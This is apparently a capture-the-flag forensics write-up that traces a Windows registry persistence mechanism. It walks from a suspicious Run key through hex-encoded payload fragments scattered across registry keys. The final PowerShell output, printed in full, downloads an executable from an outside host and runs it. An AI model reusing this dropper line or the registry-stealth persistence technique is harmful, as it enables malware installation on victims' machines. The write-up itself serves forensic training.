## CHALLENGE INFO
> Emergency! A space station near Urkir was compromised.
> Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in.
> Thus, there are now fears that the intergalactic war will also affect this neutral planet.
> If Draeger and his mercenaries manage to maintain unauthorised access in Urkir's space station and escalate their privileges, they will soon be able to activate the station's defence mechanisms that are able to prevent any spaceship from entering Urkir's airspace.
> For now, the infected machine is isolated until the case is closed.
> Help Miyuki find their persistence mechanisms so they cannot gain access again.

---
The challenge comes in the form of a downloadable zip file `forensics_golden_persistence.zip`, containing a file called `NTUSER.DAT`. This leads me to believe that this is a registry hive from the machine that is persumed infected with some sort of persistence mechanism, a registry key being a common way for this to occur.
I opened up the registry hive in `RegistryExplorer` which is made by Eric Zimmerman.
The tool can be downloaded from [Here](https://ericzimmerman.github.io/#!index.md)
When looking for persistence in a registry hive, it is always a good idea to first look for low hanging fruits such as the `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` location for any suspicious keys, that run on each machine reboot. In this case we are lucky and see a suspicious key named `Vh0F75DQu` of type `RegSz` containing a suspicious base64 encoded powershell payload. 
...
When this is decoded we obtain the following.
...
It looks like the powershell script is fetching additional values from other keys set on the system and combines them in the end, in order to be more stealthy. The keys being set to according to this naming convention `$encrypted#` `
I begin fetching the key values mentioned above.

`HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL` has the value `F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39`

`HKCU:\SOFTWARE\BjqAtIen).uLltjjW` has the value `CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1`

`HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da` has the value `C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D`

`HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl` has the value `D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1`

`HKCU:\AppEvents\Jx66ZG0O).jH54NW8C` has the value `84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB`

These values look like hex encoded strings which makes sense reasing through the script above declaring a `function HexToBin`.

Knowing a little PowerShell you can easily make the script do all the magic work for you in order to ouput the flag in the console. I did this by pasting the script into PowerShell ISE.
Then pasted the corresponding key values in to the fetching key value part and changed the PowerShell invoke expression `iex` to a `Write-Host` making it print output instead of running the script.
...
This giving us the following output containing the flag.

```PowerShell
$path ="C:\ProgramData\windows\goldenf.exe";$exists = Test-Path -Path $path -PathType Leaf;if ( $exists ){Start-Process $path}else{mkdir "C:\ProgramData\windows";Invoke-WebRequest -Uri https://thoccarthmercena
ries.edu.tho/wp-content/goldenf.exe -OutFile $path;$flag="HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}";Start-Process $path}
```
